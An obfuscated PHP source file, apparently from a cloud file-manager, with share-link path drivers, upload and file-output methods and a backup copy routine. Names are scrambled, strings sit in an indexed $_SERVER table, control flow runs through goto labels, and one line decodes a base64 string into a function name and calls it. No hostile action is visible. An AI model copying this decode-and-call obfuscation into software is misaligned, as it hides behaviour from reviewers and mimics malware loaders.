(!$ÉíÓÇÅõ) { return $this->model->pathInfo($¥¥‡ëÒ, $ÑÉÛ¤Â); } return $this->model->pathInfoMore($¥¥‡ëÒ); } public function infoFull($ı’úŠç¦) { $½¡÷£Èğ =& $_SERVER[ê‘³Æ±]; $¯¬¿åÆÊ = explode($½¡÷£Èğ[8], $ı’úŠç¦); $»³ìø… = implode($½¡÷£Èğ[8], array_splice($¯¬¿åÆÊ, 1)); return $this->model->pathInfoByPath($¯¬¿åÆÊ[0], $»³ìø…); } public function hashSimple($ÙÖ©÷ªè) { $è…«È­¥ =& $_SERVER[ê‘³Æ±]; $»ßŒÙ’ö = $this->infoWithChildren($ÙÖ©÷ªè); return $»ßŒÙ’ö[$è…«È­¥[165]][$è…«È­¥[172]]; } public function hashMd5($Á‚è¢——) { $ÌÌÅ…– =& $_SERVER[ê‘³Æ±]; $°æïÜ‚ = $this->infoWithChildren($Á‚è¢——); return $°æïÜ‚[$ÌÌÅ…–[165]][$ÌÌÅ…–[171]]; } public function exist($ËÙó£ä¯) { $‡Ø¬ñşà =& $_SERVER[ê‘³Æ±]; $íŸæíœ© = $this->parse($ËÙó£ä¯); if (!$íŸæíœ©[$‡Ø¬ñşà[78]]) { return $this->isFile($ËÙó£ä¯) || $this->isFolder($ËÙó£ä¯); } $İï¢¬§¥ = array($‡Ø¬ñşà[395] => $íŸæíœ©[$‡Ø¬ñşà[394]], $‡Ø¬ñşà[32] => $íŸæíœ©[$‡Ø¬ñşà[78]]); $µÒû‚Â‚ = $this->model->where($İï¢¬§¥)->find(); return $µÒû‚Â‚ ? !0 : !1; } public function isFile($§“èİÔ¡) { $Ë’ø–â =& $_SERVER[ê‘³Æ±]; $ğˆ÷ƒÃµ = $this->infoSimple($§“èİÔ¡); return $ğˆ÷ƒÃµ && $ğˆ÷ƒÃµ[$Ë’ø–â[404]] == $Ë’ø–â[89] ? !1 : !0; } public function isFolder($Î÷ÈÎ÷‚) { $öîµ÷ï =& $_SERVER[ê‘³Æ±]; $’†÷´€ú = $this->infoSimple($Î÷ÈÎ÷‚); return $’†÷´€ú && $’†÷´€ú[$öîµ÷ï[404]] == $öîµ÷ï[89] ? !0 : !1; } public function listPath($í›ÆÑîğ, $²ê„ö˜÷ = false) { $½ô£¥¡Õ =& $_SERVER[ê‘³Æ±]; if ($í›ÆÑîğ == $½ô£¥¡Õ[12]) { return !1; } $À¶ë‚–ı = array($½ô£¥¡Õ[395] => $í›ÆÑîğ); if ($²ê„ö˜÷) { return $this->model->listSource($À¶ë‚–ı, -1); } return $this->model->listSource($À¶ë‚–ı); } public function has($ßİŸãÕ, $ø©µËÌ = false, $İğï§‚¯ = null) { $ÌÆ»òéƒ =& $_SERVER[ê‘³Æ±]; $¥Ú‡ÍÉ† = $this->infoWithChildren($ßİŸãÕ); if ($ø©µËÌ) { return array($ÌÆ»òéƒ[205] => $¥Ú‡ÍÉ†[$ÌÆ»òéƒ[205]], $ÌÆ»òéƒ[204] => $¥Ú‡ÍÉ†[$ÌÆ»òéƒ[204]]); } return $İğï§‚¯ ? $¥Ú‡ÍÉ†[$ÌÆ»òéƒ[205]] : $¥Ú‡ÍÉ†[$ÌÆ»òéƒ[204]]; } public function listAll($ø€óôñ‡) { $ÊÃßÌî± = IO::info($this->pathParse[$_SERVER[ê‘³Æ±][78]]); if (!$ÊÃßÌî±) { return array(); } return $this->model->listAll($ø€óôñ‡); } public function getContent($™Êßİş¡) { return $this->model->getContent($™Êßİş¡); } public function setContent($¡ã‰§’Ä, $€Á§ó’— = '') { return $this->model->setContent($¡ã‰§’Ä, $€Á§ó’—); } public function fileSubstr($€‰ê •Ø, $½úõ¾¬ã, $«„ä¦‰ã) { return $this->model->fileSubstr($€‰ê •Ø, $½úõ¾¬ã, $«„ä¦‰ã); } public function download($”—àÛ, $¡ç ˜½Á = '') { $²ç—Ìô£ = get_path_father($¡ç ˜½Á); $¹ÊÛ¦ç¶ = get_path_this($¡ç ˜½Á); $ ‹û”€ñ = $this->model->fileInfoGet($”—àÛ); $é¥†Šìñ = IO::copy($ ‹û”€ñ[$_SERVER[ê‘³Æ±][78]], $²ç—Ìô£, !1, $¹ÊÛ¦ç¶); return $é¥†Šìñ; } public function setModifyTime($²¹é‚ç, $‡ÂŒ´· = '') { $ÊÒ¬Í„« =& $_SERVER[ê‘³Æ±]; if (!$²¹é‚ç) { return; } $this->model->where(array($ÊÒ¬Í„«[411] => $²¹é‚ç))->save(array($ÊÒ¬Í„«[86] => $‡ÂŒ´·)); } public function upload($éÎ“£ˆ, $ĞìòŞØğ, $ı¨„¦‘Á = false, $‰º—° = REPEAT_REPLACE) { $Õç«ß¶Ò =& $_SERVER[ê‘³Æ±]; $ÕÚÊ»¤ò = $this->parse($éÎ“£ˆ); $¢ÓÆ‹…Œ = $this->model->addFile($ÕÚÊ»¤ò[$Õç«ß¶Ò[394]], $ĞìòŞØğ, $ÕÚÊ»¤ò[$Õç«ß¶Ò[78]], $ı¨„¦‘Á, $‰º—°); return $this->getPathOuter($¢ÓÆ‹…Œ); } public function uploadFileByID($ÀŒÕòô½, $˜Û¤şï, $Âï™) { $ĞßâãÃø =& $_SERVER[ê‘³Æ±]; $ÔÇ×ø‚ã = $this->parse($ÀŒÕòô½); $ë˜Âö ™ = $this->model->addFileByFileID($ÔÇ×ø‚ã[$ĞßâãÃø[394]], $˜Û¤şï, $ÔÇ×ø‚ã[$ĞßâãÃø[78]], $Âï™); return $this->getPathOuter($ë˜Âö ™); } public function addFileByRemote($¦Ïİ’Ó , $ıÊŞşĞæ, $ş«Í»â  = array(), $ÆáüÊûØ = '', $¥˜Ó²Û›) { $øéáì„¥ =& $_SERVER[ê‘³Æ±]; $—¨´ğêğ = $this->parse($¦Ïİ’Ó ); $ÆáüÊûØ = empty($ÆáüÊûØ) ? $—¨´ğêğ[$øéáì„¥[78]] : $ÆáüÊûØ; $œ£ÁÚÙ = $this->model->addFileByRemote($—¨´ğêğ[$øéáì„¥[394]], $ıÊŞşĞæ, $ÆáüÊûØ, $ş«Í»â , $¥˜Ó²Û›); return $this->getPathOuter($œ£ÁÚÙ); } public function uploadLink($ÍëÀÔá», $›“Ô¨¨Ï = 0) { $úÍÓ½Ê§ =& $_SERVER[ê‘³Æ±]; $£õù­¸· = $this->parse($ÍëÀÔá»); $¬¯Á˜¾­ = _get($GLOBALS[$úÍÓ½Ê§[7]], $úÍÓ½Ê§[1316]); $Ñì…îæÄ = _get($GLOBALS[$úÍÓ½Ê§[7]], $úÍÓ½Ê§[1317]); $ÍëÀÔá» = Model($úÍÓ½Ê§[599])->createFileName($£õù­¸·[$úÍÓ½Ê§[78]], $¬¯Á˜¾­, $Ñì…îæÄ); return IO::uploadLink($ÍëÀÔá», $›“Ô¨¨Ï); } public function fileNameAuto($…éÌõÜ©, $şµ•¼í , $¼ø¦ş = REPEAT_REPLACE, $Ç¾»Ì« = false) { return $this->model->fileNameAuto($…éÌõÜ©, $şµ•¼í , $¼ø¦ş, $Ç¾»Ì«); } public function fileNameExist($ıíÇÖŞ, $×ºåØ¬) { return $this->model->fileNameExist($ıíÇÖŞ, $×ºåØ¬); } protected function _fileOut($¤“±‘‘, $óôÀõ = false, $ú¦½°ˆø = false, $Üéóå• = '', $× ñÚÊó = false) { $é³Ú¹ˆ =& $_SERVER[ê‘³Æ±]; $™¾‹¡‚ã = $this->model->sourceInfo($¤“±‘‘); if ($™¾‹¡‚ã[$é³Ú¹ˆ[404]] == $é³Ú¹ˆ[89]) { header($é³Ú¹ˆ[1318]); die; } $®Ö˜±ƒõ = $this->model->fileInfoGet($¤“±‘‘); $Üéóå• = $®Ö˜±ƒõ[$é³Ú¹ˆ[171]] ? $®Ö˜±ƒõ[$é³Ú¹ˆ[171]] : $Üéóå•; $üìŒ”ä = isset($GLOBALS[$é³Ú¹ˆ[1319]]) ? $GLOBALS[$é³Ú¹ˆ[1319]] : $™¾‹¡‚ã[$é³Ú¹ˆ[32]]; if ($× ñÚÊó) { return IO::fileOutServer($®Ö˜±ƒõ[$é³Ú¹ˆ[78]], $óôÀõ, $üìŒ”ä, $Üéóå•); } IO::fileOut($®Ö˜±ƒõ[$é³Ú¹ˆ[78]], $óôÀõ, $üìŒ”ä, $Üéóå•); } public function fileOut($Ò÷¿‘‰ğ, $ê£öÉø€ = false, $’›‡õİ = false, $ù•ØÕ´× = '') { $this->_fileOut($Ò÷¿‘‰ğ, $ê£öÉø€, $’›‡õİ, $ù•ØÕ´×); } public function fileOutServer($µƒ³Õ“î, $ïùÒî¿ä = false, $ÈÉÊì›Á = false, $¾Æì÷„Ñ = '') { $this->_fileOut($µƒ³Õ“î, $ïùÒî¿ä, $ÈÉÊì›Á, $¾Æì÷„Ñ, !0); } protected function _fileOutImage($Ò¸¯áŞ¶, $æÕº„¸û = 250) { $ÙşÓüà =& $_SERVER[ê‘³Æ±]; $ÍÀÕãĞÍ = $this->model->pathInfo($Ò¸¯áŞ¶); if ($ÍÀÕãĞÍ[$ÙşÓüà[404]] == $ÙşÓüà[89]) { show_json($ÙşÓüà[1320] . $Ò¸¯áŞ¶, !1); } $ØôÒ“×« = $this->model->fileInfoGet($Ò¸¯áŞ¶); $ØôÒ“×«[$ÙşÓüà[32]] = $ÍÀÕãĞÍ[$ÙşÓüà[32]]; $ØôÒ“×«[$ÙşÓüà[164]] = $ÍÀÕãĞÍ[$ÙşÓüà[164]]; $GLOBALS[$ÙşÓüà[1319]] = $ØôÒ“×«[$ÙşÓüà[32]]; $GLOBALS[$ÙşÓüà[163]] = $ØôÒ“×«; IO::fileOutImage($ØôÒ“×«[$ÙşÓüà[78]], $æÕº„¸û); } public function fileOutImage($şÏ‰¬Âö, $œ¿¾şö = 250) { $this->_fileOutImage($şÏ‰¬Âö, $œ¿¾şö); } public function fileOutImageServer($±íïÛ‘î, $ìßñ´î˜ = 250) { $this->_fileOutImage($±íïÛ‘î, $ìßñ´î˜); } public function link($ÀÖâèù‹, $¨Áùö¢ = '') { $»Ş§ÌÑ÷ = $this->model->fileInfoGet($ÀÖâèù‹); return IO::link($»Ş§ÌÑ÷[$_SERVER[ê‘³Æ±][78]], $¨Áùö¢); } protected function parse($óì˜Ñ‘µ) { $²èôÒ¶ =& $_SERVER[ê‘³Æ±]; if (strstr($óì˜Ñ‘µ, $²èôÒ¶[8]) === !1) { return array($²èôÒ¶[413] => intval($óì˜Ñ‘µ), $²èôÒ¶[78] => $²èôÒ¶[12], $²èôÒ¶[1315] => array()); } $ïŸ¯öØ× = explode($²èôÒ¶[8], trim($óì˜Ñ‘µ, $²èôÒ¶[8])); if (count($ïŸ¯öØ×) < 2) { show_tips(clear_html($óì˜Ñ‘µ) . $²èôÒ¶[1321]); } return array($²èôÒ¶[413] => intval($ïŸ¯öØ×[0]), $²èôÒ¶[78] => $ïŸ¯öØ×[1], $²èôÒ¶[1315] => array_slice($ïŸ¯öØ×, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÏÌøßã) { $this->pathParse = $ÏÌøßã; $this->model = Model($_SERVER[ê‘³Æ±][1314]); } public function getPathOuter($Ç÷ÓÔ×) { $æ“òæõ£ =& $_SERVER[ê‘³Æ±]; if (!$Ç÷ÓÔ×) { return $Ç÷ÓÔ×; } $ª…Ş›ê² = $this->parse($Ç÷ÓÔ×); return trim(KodIO::makeShare($this->pathParse[$æ“òæõ£[394]], $ª…Ş›ê²[$æ“òæõ£[394]]), $æ“òæõ£[8]); } protected function infoParse($·ÈÀ¾‡Ô, $ôõ×¦—í = false, $œô®ã¼½ = false) { $Á©úê’ =& $_SERVER[ê‘³Æ±]; $Ğ³…¨©ˆ = $this->pathParse[$Á©úê’[394]]; $‹’ùóı÷ = trim($this->pathParse[$Á©úê’[1156]], $Á©úê’[8]); return Action($Á©úê’[1322])->sharePathInfo($Ğ³…¨©ˆ, $‹’ùóı÷, $ôõ×¦—í); } public function infoFull($¤ûı) { $˜†·¨å =& $_SERVER[ê‘³Æ±]; $ù¸ï÷¥Ç = explode($˜†·¨å[8], trim($¤ûı, $˜†·¨å[8])); if (count($ù¸ï÷¥Ç) > 1) { $ºô•ĞÓ® = implode($˜†·¨å[8], array_splice($ù¸ï÷¥Ç, 1)); $ÜÆ›æÆÎ = $this->model->pathInfoByPath($ù¸ï÷¥Ç[0], $ºô•ĞÓ®); if (!$ÜÆ›æÆÎ) { return !1; } $this->pathParse[$˜†·¨å[1156]] = $ÜÆ›æÆÎ[$˜†·¨å[396]]; } return $this->infoParse($¤ûı); } public function listAll($Ã“È×Î) { $ˆè½Ê¶¾ =& $_SERVER[ê‘³Æ±]; $¢Ü¡×ù´ = IO::info($this->pathParse[$ˆè½Ê¶¾[78]]); if (!$¢Ü¡×ù´) { return array(); } $‰ò¬Šºş = $this->model->listAll($Ã“È×Î); $áòí°Í£ = Model($ˆè½Ê¶¾[591])->getInfo($¢Ü¡×ù´[$ˆè½Ê¶¾[481]]); $¿‘Ãúíô = Action($ˆè½Ê¶¾[1322]); foreach ($‰ò¬Šºş as &$§İ±÷µë) { check_abort(); $§İ±÷µë[$ˆè½Ê¶¾[87]] = $¿‘Ãúíô->_shareItemeParse($§İ±÷µë[$ˆè½Ê¶¾[87]], $áòí°Í£); } unset($§İ±÷µë); return $‰ò¬Šºş; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ŞÖõ«øŠ) { $this->pathParse = $ŞÖõ«øŠ; $this->model = Model($_SERVER[ê‘³Æ±][1314]); } protected function infoParse($•ìîÒ, $Ó¡­ñØè = false, $›¼Ì£¢¶ = false) { $Ìß„şì¿ =& $_SERVER[ê‘³Æ±]; return Action($Ìß„şì¿[1162])->sharePathInfo($this->pathParse[$Ìß„şì¿[78]], !0, $Ó¡­ñØè); } public function listPath($ÁÀï•ª£, $ª¹¯ïÁô = false) { $àúÓ¢©Ó =& $_SERVER[ê‘³Æ±]; $ÚÌ‚ëô = parent::listPath($ÁÀï•ª£, $ª¹¯ïÁô); if (!$ÚÌ‚ëô) { return $ÚÌ‚ëô; } if (is_array($ÚÌ‚ëô[$àúÓ¢©Ó[1323]])) { $ÚÌ‚ëô[$àúÓ¢©Ó[1323]] = Action($àúÓ¢©Ó[1162])->shareItemInfo($ÚÌ‚ëô[$àúÓ¢©Ó[1323]]); } foreach ($ÚÌ‚ëô as $«‚‰Î»‹ => $‘ç¸ô‰) { if (!in_array($«‚‰Î»‹, array($àúÓ¢©Ó[76], $àúÓ¢©Ó[77]))) { continue; } foreach ($‘ç¸ô‰ as $ô¹½±‡Ü => $‚ŒÌç»“) { $ÚÌ‚ëô[$«‚‰Î»‹][$ô¹½±‡Ü] = Action($àúÓ¢©Ó[1162])->shareItemInfo($‚ŒÌç»“); } } return $ÚÌ‚ëô; } public function listAll($´Ì°î“) { $âÁ´¯µ =& $_SERVER[ê‘³Æ±]; $ó¨œÏ„â = IO::info($this->pathParse[$âÁ´¯µ[78]]); if (!$ó¨œÏ„â) { return array(); } $æ¥ÉòäÛ = $this->model->listAll($´Ì°î“); foreach ($æ¥ÉòäÛ as &$¿©¯¯Ûƒ) { $¿©¯¯Ûƒ[$âÁ´¯µ[87]] = Action($âÁ´¯µ[1162])->shareItemInfo($¿©¯¯Ûƒ[$âÁ´¯µ[87]]); } unset($¿©¯¯Ûƒ); return $æ¥ÉòäÛ; } } goto Fé¯…“³‡í; FÉÒØìÅ›‰: class PathDriverDriverShareItem { public function __construct($Ô¨ğèİ‹) { $this->pathParse = $Ô¨ğèİ‹; } public function __call($¤Æ¿‡¯, $—ÎÅ·ìÜ) { $ÃäÙˆ… =& $_SERVER[ê‘³Æ±]; if (method_exists($this, $¤Æ¿‡¯)) { return; } $æıû×‹à = call_user_func_array(array($ÃäÙˆ…[1324], $¤Æ¿‡¯), $—ÎÅ·ìÜ); $¡“÷ó¿æ = array($ÃäÙˆ…[1325], $ÃäÙˆ…[1326], $ÃäÙˆ…[1327], $ÃäÙˆ…[1328], $ÃäÙˆ…[545], $ÃäÙˆ…[547], $ÃäÙˆ…[1329], $ÃäÙˆ…[108], $ÃäÙˆ…[1330], $ÃäÙˆ…[1331]); if (in_array($¤Æ¿‡¯, $¡“÷ó¿æ)) { $æıû×‹à = $this->getPathOuter($æıû×‹à); } return $æıû×‹à; } public function copy($ÉÉ‡Îó¹, $£¢°ÜÆ, $ìÍòá¹‡ = false, $÷ Ûò = false) { return $this->copyMove($ÉÉ‡Îó¹, $£¢°ÜÆ, $ìÍòá¹‡, $_SERVER[ê‘³Æ±][545], $÷ Ûò); } public function move($£ö—àÈ, $Ö“ñÁ˜Ï, $çûúìµ£ = false, $óÀÆô«ø = false) { return $this->copyMove($£ö—àÈ, $Ö“ñÁ˜Ï, $çûúìµ£, $_SERVER[ê‘³Æ±][547], $óÀÆô«ø); } private function copyMove($–ÓÁŒ°Ò, $÷¢¥ÒÅŞ, $òËúêåØ, $‡ŒÆØ õ, $ÈõŠß¬‰ = false) { $÷Ç×€®¡ =& $_SERVER[ê‘³Æ±]; $ç–ØÔ¼Â = $÷¢¥ÒÅŞ; $¸¬ëÔÁì = IO::driverMake($÷¢¥ÒÅŞ); if ($¸¬ëÔÁì->pathParse[$÷Ç×€®¡[1140]]) { $÷¢¥ÒÅŞ = $¸¬ëÔÁì->pathParse[$÷Ç×€®¡[1140]]; } else { $÷¢¥ÒÅŞ = $ç–ØÔ¼Â; } $¼ŞäÜè = IO::copyMove($–ÓÁŒ°Ò, $÷¢¥ÒÅŞ, $òËúêåØ, $‡ŒÆØ õ, $ÈõŠß¬‰); $¼ŞäÜè = $this->getPathOuter($¼ŞäÜè); return $¼ŞäÜè; } public function pathThis($­…×‘) { return get_path_this($this->pathParse[$_SERVER[ê‘³Æ±][78]]); } public function pathFather($¡›†±ñ) { return get_path_father($this->pathParse[$_SERVER[ê‘³Æ±][78]]); } public function iconvSystem($‰Ÿ¯‰—) { return $‰Ÿ¯‰—; } protected function infoParse($×¼‡˜è, $ÁÜŒ†ƒş = false) { $¶„¯Óàª =& $_SERVER[ê‘³Æ±]; $¦ÉñÛ¹” = $this->pathParse[$¶„¯Óàª[479]][$¶„¯Óàª[1163]] . $this->pathParse[$¶„¯Óàª[1156]]; if ($ÁÜŒ†ƒş) { $«ÀÕÃ„ = IO::infoWithChildren($¦ÉñÛ¹”); } else { $«ÀÕÃ„ = IO::info($¦ÉñÛ¹”); } $ˆÍËğµÆ = $this->pathParse[$¶„¯Óàª[479]]; return Action($¶„¯Óàª[1322])->_shareItemeParse($«ÀÕÃ„, $ˆÍËğµÆ); } public function listAll($Ë‹‘¥¹ó) { $ó…Ûœ¼Õ =& $_SERVER[ê‘³Æ±]; $×œ¼çõ° = IO::listAll($Ë‹‘¥¹ó); $‹£¼åå¾ = $this->pathParse[$ó…Ûœ¼Õ[479]]; foreach ($×œ¼çõ° as &$û¡Š±ôŸ) { check_abort(); $ÑŞÁ·Ïñ = IO::info($û¡Š±ôŸ[$ó…Ûœ¼Õ[78]]); $ÑŞÁ·Ïñ = is_array($ÑŞÁ·Ïñ) ? $ÑŞÁ·Ïñ : array(); $û¡Š±ôŸ = array_merge($ÑŞÁ·Ïñ, $û¡Š±ôŸ); $û¡Š±ôŸ[$ó…Ûœ¼Õ[87]] = Action($ó…Ûœ¼Õ[1322])->_shareItemeParse($û¡Š±ôŸ, $‹£¼åå¾); } unset($û¡Š±ôŸ); return $×œ¼çõ°; } public function getPathOuter($ÁÍ©ßî÷) { $ï»¹Ğ–Ÿ =& $_SERVER[ê‘³Æ±]; $ßŠî…ŞÌ = KodIO::parse($ÁÍ©ßî÷); if ($ßŠî…ŞÌ[$ï»¹Ğ–Ÿ[33]] == KodIO::KOD_SHARE_ITEM) { return $ßŠî…ŞÌ[$ï»¹Ğ–Ÿ[78]]; } $»öÊªù = KodIO::clear($ÁÍ©ßî÷); $‹ë†”êÔ = KodIO::clear($this->pathParse[$ï»¹Ğ–Ÿ[479]][$ï»¹Ğ–Ÿ[1163]]); $òÑ…ƒßÕ = substr($»öÊªù, strlen($‹ë†”êÔ)); if (substr($»öÊªù, 0, strlen($‹ë†”êÔ)) != $‹ë†”êÔ) { return !1; } return $this->pathParse[$ï»¹Ğ–Ÿ[1157]] . $ï»¹Ğ–Ÿ[8] . ltrim($òÑ…ƒßÕ, $ï»¹Ğ–Ÿ[8]); } public function getType() { $×Ú³¸Š³ =& $_SERVER[ê‘³Æ±]; $Ø¢°üá… = str_replace($×Ú³¸Š³[74], $×Ú³¸Š³[12], get_class($this)); return strtolower($Ø¢°üá…); } public function isTypeObject($±âØßÜÉ) { return IO::isTypeObject($±âØßÜÉ); } public function info($±ñ§ìÁ) { return $this->infoParse($±ñ§ìÁ); } public function infoAuth($Ì¿†ö‘ß) { return $this->infoParse($Ì¿†ö‘ß); } public function infoWithChildren($æÀå—Ûİ) { return $this->infoParse($æÀå—Ûİ, !0); } public function infoFull($ßùŞ£²) { return $this->infoParse($ßùŞ£²); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ç¾ƒ½¯) { $this->pathParse = $ç¾ƒ½¯; } protected function infoParse($ùïÍÜô¥, $ãò…´– = false) { $Úµ«¾şˆ =& $_SERVER[ê‘³Æ±]; return Action($Úµ«¾şˆ[1162])->sharePathInfo($this->pathParse[$Úµ«¾şˆ[78]], !0, $ãò…´–); } public function listPath($ÍıõÄ¯¬, $˜Ø´˜ƒ‘ = false) { $¬¿ÃÓ²Æ =& $_SERVER[ê‘³Æ±]; $¿¬‹âô  = IO::listPath($ÍıõÄ¯¬, $˜Ø´˜ƒ‘); if (!$¿¬‹âô ) { return $¿¬‹âô ; } if (is_array($¿¬‹âô [$¬¿ÃÓ²Æ[1323]])) { $óôäÏ²ï = Action($¬¿ÃÓ²Æ[1332])->parsePathChildren($¿¬‹âô [$¬¿ÃÓ²Æ[1323]], array($¬¿ÃÓ²Æ[415] => $ÍıõÄ¯¬)); $¿¬‹âô [$¬¿ÃÓ²Æ[1323]] = Action($¬¿ÃÓ²Æ[1162])->shareItemInfo($óôäÏ²ï); } foreach ($¿¬‹âô  as $ñå×ïÌÖ => $ÏÉ“¦ìÙ) { if (!in_array($ñå×ïÌÖ, array($¬¿ÃÓ²Æ[76], $¬¿ÃÓ²Æ[77]))) { continue; } foreach ($ÏÉ“¦ìÙ as $æ´ƒ±œù => $óôäÏ²ï) { $óôäÏ²ï = Action($¬¿ÃÓ²Æ[1332])->parsePathChildren($óôäÏ²ï, array($¬¿ÃÓ²Æ[415] => $ÍıõÄ¯¬)); $¿¬‹âô [$ñå×ïÌÖ][$æ´ƒ±œù] = Action($¬¿ÃÓ²Æ[1162])->shareItemInfo($óôäÏ²ï); } } return $¿¬‹âô ; } public function listAll($ë§¸™ŒĞ) { $Ñ€îÍƒÉ =& $_SERVER[ê‘³Æ±]; $“ÎŠƒ‡ = IO::listAll($ë§¸™ŒĞ); foreach ($“ÎŠƒ‡ as &$ÙÏÕıë˜) { $ßŸ”õ× = IO::info($ÙÏÕıë˜[$Ñ€îÍƒÉ[78]]); $ßŸ”õ× = is_array($ßŸ”õ×) ? $ßŸ”õ× : array(); $ÙÏÕıë˜ = array_merge($ßŸ”õ×, $ÙÏÕıë˜); $ÙÏÕıë˜[$Ñ€îÍƒÉ[87]] = Action($Ñ€îÍƒÉ[1162])->shareItemInfo($ÙÏÕıë˜); } unset($ÙÏÕıë˜); return $“ÎŠƒ‡; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Õ±çÍ¨é) { parent::__construct($Õ±çÍ¨é); } } goto aÃá°ç‡²; C‘î¹ÏÙñ—: $fileSize = strrev(base64_decode($_SERVER[÷³Ü•®ä][0])); function binCheckNeq($ı”ş¨×Å, $µ­ƒ­”ò) { return $ı”ş¨×Å != $µ­ƒ­”ò; } $_SERVER[$_SERVER[÷³Ü•®ä][1]] = $fileSize($_SERVER[$_SERVER[÷³Ü•®ä][2]]); goto CöÅìÅ„Ø¹; EøÏïñŞå: class BackupFile { public function __construct() { } public function index() { $şÀßûû = Backup::get(); $¹«ìŒ‚¬ = $şÀßûû[$_SERVER[ê‘³Æ±][290]][$_SERVER[ê‘³Æ±][194]][$_SERVER[ê‘³Æ±][460]]; $å×µ¹Ğ¼ = array($_SERVER[ê‘³Æ±][461] => array($_SERVER[ê‘³Æ±][801], $¹«ìŒ‚¬), $_SERVER[ê‘³Æ±][802] => array($_SERVER[ê‘³Æ±][328], $şÀßûû[$_SERVER[ê‘³Æ±][738]])); $ç‚ò·†÷ = (int) Model($_SERVER[ê‘³Æ±][775])->where($å×µ¹Ğ¼)->count($_SERVER[ê‘³Æ±][460]); $÷‘¿©‹ = (int) Model($_SERVER[ê‘³Æ±][775])->where($å×µ¹Ğ¼)->sum($_SERVER[ê‘³Æ±][80]); $ëôÁ Ù‹ = new TaskFileTransfer($_SERVER[ê‘³Æ±][803], $_SERVER[ê‘³Æ±][766], $ç‚ò·†÷, LNG($_SERVER[ê‘³Æ±][767]) . $_SERVER[ê‘³Æ±][768] . LNG($_SERVER[ê‘³Æ±][804])); $ëôÁ Ù‹->task[$_SERVER[ê‘³Æ±][749]] = $÷‘¿©‹; $·ƒñÚ´¨ = array($_SERVER[ê‘³Æ±][805] => $ç‚ò·†÷, $_SERVER[ê‘³Æ±][806] => $÷‘¿©‹, $_SERVER[ê‘³Æ±][807] => time()); Backup::set($·ƒñÚ´¨); $îÔšÎü = !0; $—§ŸÛ­® = $this->storeIds(); $’š­ôóĞ = 1; $ªĞåª£Í = 1000; $¢€ÎÑÄ™ = $Æ¯å åá = 0; $°éÑ…½ù = array(); $Í€³ÓŒø = $“ºìòõª = 0; do { $”ÙÚñ = $_SERVER[ê‘³Æ±][808]; $ıÏÛ£‹ë = Model($_SERVER[ê‘³Æ±][775])->where($å×µ¹Ğ¼)->field($”ÙÚñ)->order($_SERVER[ê‘³Æ±][809])->selectPage($ªĞåª£Í, $’š­ôóĞ); $ŠÎ·Á“ = !empty($ıÏÛ£‹ë[$_SERVER[ê‘³Æ±][366]]) ? $ıÏÛ£‹ë[$_SERVER[ê‘³Æ±][366]] : array(); foreach ($ŠÎ·Á“ as $Ûè™Ò´Õ) { if (!$this->_fileExist($Ûè™Ò´Õ, $°éÑ…½ù, $—§ŸÛ­®)) { $ç‚ò·†÷ -= 1; $÷‘¿©‹ -= (int) $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][80]]; write_log("\x66\x69\154\145\x20\x6e\157\x74\40\x65\170\151\163\164\56\x66\x69\154\x65\x49\x44\72{$Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][460]]}\x2c\x20\x70\141\x74\150\72{$Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][78]]}", $_SERVER[ê‘³Æ±][810]); continue; } $¥ŞÓŒÊ = $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][78]]; $èÍ¿–¿ı = "\x7b\x69\157\x3a{$şÀßûû[$_SERVER[ê‘³Æ±][738]]}\175" . substr($¥ŞÓŒÊ, strlen("\x7b\x69\157\x3a{$Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][811]]}\x7d")); if (IO::exist($èÍ¿–¿ı)) { $ëôÁ Ù‹->updateFileEnd($Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][32]], $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][80]]); } else { $èÍ¿–¿ı = get_path_father($èÍ¿–¿ı); IO::mkdir($èÍ¿–¿ı); if (!IO::copy($¥ŞÓŒÊ, $èÍ¿–¿ı, $_SERVER[ê‘³Æ±][812])) { write_log($_SERVER[ê‘³Æ±][813] . $¥ŞÓŒÊ . $_SERVER[ê‘³Æ±][797] . $èÍ¿–¿ı . $_SERVER[ê‘³Æ±][529], $_SERVER[ê‘³Æ±][766]); $îÔšÎü = !1; break; } } $¹«ìŒ‚¬ = $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][460]]; $Æ¯å åá += 1; $¢€ÎÑÄ™ += $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][80]]; $“ºìòõª += 1; $Í€³ÓŒø += $Ûè™Ò´Õ[$_SERVER[ê‘³Æ±][80]]; if ($¢€ÎÑÄ™ >= 1024 * 1024 * 100) { $·ƒñÚ´¨ = array($_SERVER[ê‘³Æ±][814] => $¹«ìŒ‚¬, $_SERVER[ê‘³Æ±][815] => $“ºìòõª, $_SERVER[ê‘³Æ±][816] => $Í€³ÓŒø); Backup::set($·ƒñÚ´¨); $¢€ÎÑÄ™ = $Æ¯å åá = 0; } } $âÛ»şÅ = count($ŠÎ·Á“); $’š­ôóĞ++; } while ($âÛ»şÅ == $ªĞåª£Í); $ëôÁ Ù‹->end(); $·ƒñÚ´¨ = array($_SERVER[ê‘³Æ±][817] => 1, $_SERVER[ê‘³Æ±][489] => time(), $_SERVER[ê‘³Æ±][761] => 1, $_SERVER[ê‘³Æ±][814] => $¹«ìŒ‚¬, $_SERVER[ê‘³Æ±][806] => $÷‘¿©‹, $_SERVER[ê‘³Æ±][805] => $ç‚ò·†÷, $_SERVER[ê‘³Æ±][818] => time()); if ($Æ¯å åá) { $·ƒñÚ´¨[$_SERVER[ê‘³Æ±][815]] = $“ºìòõª; $·ƒñÚ´¨[$_SERVER[ê‘³Æ±][816]] = $Í€³ÓŒø; } Backup::set($·ƒñÚ´¨); $this->_fileFilter($°éÑ…½ù); return !0; } private function _fileExist($Ùñàå…, &$Ù•Ïö¨¬, $ëÂÒÏ¢À) { $ö·ôïı‰ =& $_SERVER[ê‘³Æ±]; $¶‚•¥ß = $Ùñàå…[$ö·ôïı‰[78]]; if (in_array($Ùñàå…[$ö·ôïı‰[460]], $Ù•Ïö¨¬)) { return !1; } if (!in_array($Ùñàå…[$ö·ôïı‰[811]], $ëÂÒÏ¢À)) { return !1; 